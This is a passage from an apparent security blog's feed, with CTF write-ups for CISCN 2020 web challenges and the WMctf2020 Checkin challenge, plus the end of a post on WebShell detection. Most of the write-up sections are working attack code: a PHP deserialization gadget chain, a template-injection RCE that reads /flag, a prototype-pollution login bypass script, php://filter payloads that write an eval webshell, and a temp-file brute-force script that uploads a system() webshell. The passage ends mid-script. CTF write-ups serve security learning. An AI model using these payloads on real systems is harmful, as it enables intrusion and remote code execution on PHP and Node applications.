l，属于事前预警；基于流量的检测是从攻击者与WebShell的交互流量中提取特征并进行判断，基于行为的检测是在WebShel l运行时对其异常行为进行分析，这两类均属于事中检测； 而基于日志的检测是对Web日志进行全局分析，发现正常访问日志与WebShell访问日志的差异，从而判断是否已经遭受了WebShell攻击并定位WebShell，属于事后追溯。</p><p>抽象语法树（Abstract Syntax Tree，AST）是编程语言的抽象语法结构的树状表现形式，作为编译器后端的输入，不依赖于具体的文法和语言的细节。通过对抽象语法树进行分析，可以获得对代码语义层面的理解。抽象语法树的生成过程包括词法分析和语法分析两个步骤，其中词法分析是将代码字符流转变为标记（Token）的过程，语法分析是根据标记集合构造抽象语法树的过程。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者WebShell的行为和目的主要包括四个方面。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;信息嗅探&lt;/strong&gt;：以嗅探Web运行环境信息、主机信息、数据库信息、IDC网络信息为目的，将收集到的各类信息回显在页面中或通过其它渠道反馈给攻击者，攻击者可以将收集到的信息用于下一步的入侵中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;权限维持&lt;/strong&gt;：攻击者可以通过HTTP请求的参数（包括GET/POST参数、Cookie、Header等）传递命令，由WebShell以Web应用运行权限执行命令，是一种攻击成功后较隐蔽的权限维持手段。此外，攻击者还可以通过各种反弹Shell手法获取到交互式Shell，利用系统本地内核漏洞进行提权。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据窃取和篡改&lt;/strong&gt;：嗅探到数据库连接方式等配置信息后，攻击者可以利用WebShell窃取或篡改数据库内的敏感信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;网络代理&lt;/strong&gt;： 攻击者可以利用WebShel l建立TCP/IP网络隧道，用于嗅探、扫描IDC网络和进一步的内网渗透，例如著名的reGeorg工具就利用了WebShell建立SOCKS5隧道。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Webshell检测" scheme="https://cyc1e183.github.io/tags/Webshell%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2020_初赛web</title>
    <link href="https://cyc1e183.github.io/2020/08/21/CISCN2020-%E5%88%9D%E8%B5%9Bweb/"/>
    <id>https://cyc1e183.github.io/2020/08/21/CISCN2020-%E5%88%9D%E8%B5%9Bweb/</id>
    <published>2020-08-21T01:27:02.000Z</published>
    <updated>2020-08-21T01:32:51.454Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>题目源码的意思就是打down子进程就会进入phpinfo，参考<a href="https://bugs.php.net/bug.php?id=52173，flag就在phpinfo里。" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=52173，flag就在phpinfo里。</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=call_user_func&amp;b=pcntl_waitpid</span><br></pre></td></tr></table></figure><p><img src="/2020/08/21/CISCN2020-%E5%88%9D%E8%B5%9Bweb/image-20200820140345007.png" alt></p><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>wmctf2020中的webweb，网上找到了一个链改改可以用的 <a href="http://phoebe233.cn/?p=56" target="_blank" rel="noopener">http://phoebe233.cn/?p=56</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Mapper</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $adhoc=[],$db,$props=[];</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>( <span class="number">30</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"phpinfo"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $server;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent())));</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>CLI%<span class="number">5</span>CWS%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>BO%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>CLI%<span class="number">5</span>CAgent%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>server%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>stdClass%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>events%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>disconnect%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>DB%<span class="number">5</span>CSQL%<span class="number">5</span>CMapper%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>adhoc%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A30%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Ftmp%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>db%<span class="number">22</span>%<span class="number">3</span>Br%<span class="number">3</span>A7%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>props%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>quotekey%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>phpinfo%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22f</span>ind%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="/2020/08/21/CISCN2020-%E5%88%9D%E8%B5%9Bweb/image-20200820163343264.png" alt></p><h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>zzzphp的后台RCE的代码，直接网上找一个poc构造绕过过滤即可。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">a</span>=&#123;<span class="keyword">if</span>:<span class="built_in">printf</span>(`<span class="keyword">cat</span> /flag`)&#125;<span class="keyword">x</span>&#123;<span class="keyword">endif</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/21/CISCN2020-%E5%88%9D%E8%B5%9Bweb/image-20200820201301682.png" alt></p><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><p>set-value原型链污染，参考<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> <span class="type">json</span></span><br><span class="line"></span><br><span class="line">s = requests.<span class="keyword">session</span>()</span><br><span class="line">url1 = <span class="string">'http://eci-2zebqdx3ky4mqjhxqmo6.cloudeci1.ichunqiu.com:8888/SpawnPoint'</span></span><br><span class="line">url2 = <span class="string">'http://eci-2zebqdx3ky4mqjhxqmo6.cloudeci1.ichunqiu.com:8888/Privilege'</span></span><br><span class="line">url3 = <span class="string">'http://eci-2zebqdx3ky4mqjhxqmo6.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel'</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>:<span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;"NewAttributeKey":"constructor.prototype.a1","NewAttributeValue":"passwd"&#125;</span><br><span class="line"><span class="keyword">login</span> = &#123;"key":"a1","password":"passwd"&#125;</span><br><span class="line">req1=s.<span class="keyword">get</span>(url1)</span><br><span class="line">req=s.post(url2,headers=headers,data=<span class="type">json</span>.dumps(payload))</span><br><span class="line">res=s.post(url3,headers=headers,data=<span class="type">json</span>.dumps(<span class="keyword">login</span>))</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><img src="/2020/08/21/CISCN2020-%E5%88%9D%E8%B5%9Bweb/image-20200821090104942.png" alt></p><h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>$trick1和$trick2的md5值要相等，长度还有限制，所以思路就是$trick2经过处理后得到和$trick1一样的字符，所以直接想到的就是1/0 = &gt; INF。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $trick1=INF;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $trick2=<span class="number">1</span>/<span class="number">0</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> trick();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($a));</span></span><br></pre></td></tr></table></figure><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>国赛这web题的质量也是无话可说了，果然web是没有前途的，5题还不如其他方向的1题，这叫官方劝退？</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;easyphp&quot;&gt;&lt;a href=&quot;#easyphp&quot; class=&quot;headerlink&quot; title=&quot;easyphp&quot;&gt;&lt;/a&gt;easyphp&lt;/h2&gt;&lt;p&gt;题目源码的意思就是打down子进程就会进入phpinfo，参考&lt;a href=&quot;https://bugs.php.net/bug.php?id=52173，flag就在phpinfo里。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bugs.php.net/bug.php?id=52173，flag就在phpinfo里。&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="ciscn" scheme="https://cyc1e183.github.io/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>WMctf2020 Checkin出题想法&amp;题解</title>
    <link href="https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/"/>
    <id>https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/</id>
    <published>2020-08-04T08:42:53.000Z</published>
    <updated>2020-08-04T08:48:40.935Z</updated>
    
    <content type="html"><![CDATA[<p>考点主要源于我之前再写文章 <a href="https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/">关于file_put_contents的一些小测试</a> 中遇到的一些问题。题目源代码很简单👇</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$sandbox = <span class="string">'/var/www/html/'</span> . md5($_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $content = $_GET[<span class="string">'content'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/iconv|UCS|UTF|rot|quoted|base64/i'</span>,$content))</span></span><br><span class="line"><span class="php">         <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(file_exists($content))</span></span><br><span class="line"><span class="php">        <span class="keyword">require_once</span>($content);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $content;</span></span><br><span class="line"><span class="php">    file_put_contents($content,<span class="string">'&lt;?php exit();'</span>.$content);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>对于运用的话：很多框架（就不具体说了）喜欢用一个<code>file_put_contents($filename,&#39;&lt;?php exit();&#39;.$content);</code>来生成一个php文件，在代码审计中也经常会遇到，所以题目也就是考察一种参数可控的情况下的一种绕过方式。简单来说就是死亡exit的绕过，我在上一篇文章中介绍了挺多的方法，不过我在这题中把那些方法都ban了，所以很明显，出发点就在于函数的特性，其他过滤器的使用，或者配置环境了……</p><h3 id="1-二次编码绕过"><a href="#1-二次编码绕过" class="headerlink" title="1.二次编码绕过"></a>1.二次编码绕过</h3><p>查看伪协议处理的源码👇</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">static void php<span class="constructor">_stream_apply_filter_list(<span class="params">php_stream</span> <span class="operator">*</span><span class="params">stream</span>, <span class="params">char</span> <span class="operator">*</span><span class="params">filterlist</span>, <span class="params">int</span> <span class="params">read_chain</span>, <span class="params">int</span> <span class="params">write_chain</span>)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">char</span> *p, *token = NULL;</span><br><span class="line">php_stream_filter *temp_filter;</span><br><span class="line"></span><br><span class="line">p = php<span class="constructor">_strtok_r(<span class="params">filterlist</span>, <span class="string">"|"</span>, &amp;<span class="params">token</span>)</span>;</span><br><span class="line"><span class="keyword">while</span> (p) &#123;</span><br><span class="line">php<span class="constructor">_url_decode(<span class="params">p</span>, <span class="params">strlen</span>(<span class="params">p</span>)</span>);#👈对过滤器进行了一次urldecode</span><br><span class="line"><span class="keyword">if</span> (read_chain) &#123;</span><br><span class="line"><span class="keyword">if</span> ((temp_filter = php<span class="constructor">_stream_filter_create(<span class="params">p</span>, NULL, <span class="params">php_stream_is_persistent</span>(<span class="params">stream</span>)</span>))) &#123;</span><br><span class="line">php<span class="constructor">_stream_filter_append(&amp;<span class="params">stream</span>-&gt;<span class="params">readfilters</span>, <span class="params">temp_filter</span>)</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">php<span class="constructor">_error_docref(NULL, E_WARNING, <span class="string">"Unable to create filter (%s)"</span>, <span class="params">p</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (write_chain) &#123;</span><br><span class="line"><span class="keyword">if</span> ((temp_filter = php<span class="constructor">_stream_filter_create(<span class="params">p</span>, NULL, <span class="params">php_stream_is_persistent</span>(<span class="params">stream</span>)</span>))) &#123;</span><br><span class="line">php<span class="constructor">_stream_filter_append(&amp;<span class="params">stream</span>-&gt;<span class="params">writefilters</span>, <span class="params">temp_filter</span>)</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">php<span class="constructor">_error_docref(NULL, E_WARNING, <span class="string">"Unable to create filter (%s)"</span>, <span class="params">p</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p = php<span class="constructor">_strtok_r(NULL, <span class="string">"|"</span>, &amp;<span class="params">token</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了，可以简单构造一下参见的payload即可，可参考我之前写的文章中的一些payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$char = <span class="string">'r'</span>; <span class="comment">#构造r的二次编码</span></span></span><br><span class="line"><span class="php"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123;</span></span><br><span class="line"><span class="php">$aaa = <span class="string">'%'</span>.$ascii1.<span class="string">'%'</span>.$ascii2;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $char.<span class="string">': '</span>.$aaa;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.%<span class="number">7</span>%<span class="number">32</span>ot13|cuc cucvasb();|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Cyc1e.php</span></span><br><span class="line"><span class="meta">&lt;?</span>cuc rkvg();cuc:<span class="comment">//svygre/jevgr=fgevat.%72bg13|<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>|/erfbhepr=Plp1r.cuc</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>：payload放过滤器的位置或者放文件名位置都可（因为有些编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，然后跳过继续执行的）。</p><h3 id="2-过滤器构造绕过"><a href="#2-过滤器构造绕过" class="headerlink" title="2.过滤器构造绕过"></a>2.过滤器构造绕过</h3><p>我再题目中过滤的过滤器有👇</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/iconv|<span class="type">UCS</span>|<span class="type">UTF</span>|<span class="type">rot</span>|<span class="type">quoted</span>|<span class="type">base64</span>/</span><br></pre></td></tr></table></figure><p><code>php:filter</code>支持使用多个过滤器，参考官方文档 <a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">可用过滤器列表</a>，还留下了<strong>字符串过滤器中的部分</strong>和<strong>压缩过滤器</strong>以及<strong>加密过滤器</strong>，所以可以考虑从这几个过滤器入手，最好用的应该就是<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/zlib.deflate|<span class="keyword">string</span>.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?</span>php%<span class="number">0</span>deval(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>/resource=Cyc1e.php</span><br></pre></td></tr></table></figure><p>当然，也是可以通过构造单个字符，通过<code>zlib.deflate</code>压缩来形成shell，这里就不多说了~</p><h3 id="3-爆破临时文件"><a href="#3-爆破临时文件" class="headerlink" title="3.爆破临时文件"></a>3.爆破临时文件</h3><p>题目的环境特地设置了php 7.0.33版本，由于file_put_contents也可以利用伪协议，所以利用再利用string.strip_tags会发生segment fault，这时候上传一个webshell会以临时文件的形式保存在/tmp中（老知识点了），利用require_once包含getshell即可（题目的设置是用一次就会被覆盖，所以直接反弹shell或者写马就行，这个是一个最不好的解作为题目的备选解）。</p><p>不过实际运维题目的时候，因为爆破的基数太大了，在比赛的时候太多人同时爆破形成了DDOS了，服务器也承受不住，所以我们没办法，只好选择封堵这条路了（莫怪）。简单放下生成临时文件的脚本（<a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">LFI via SegmentFault</a> copy的）👇</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">"web_checkin2.wmctf.wetolink.com"</span></span><br><span class="line">port = 80</span><br><span class="line">base_url = <span class="string">"http://%s:%d"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload_file_to_include(url, file_content):</span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, <span class="attribute">files</span>=files)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        <span class="builtin-name">print</span> e</span><br><span class="line"></span><br><span class="line">def generate_tmp_files():</span><br><span class="line">    file_content = <span class="string">'&lt;?php system("xxxxxxxx");?&gt;'</span></span><br><span class="line">    phpinfo_url = <span class="string">"%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    <span class="builtin-name">print</span> phpinfo_url</span><br><span class="line">    length = 6</span><br><span class="line">    times = len(charset) ** (length / 2)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"><span 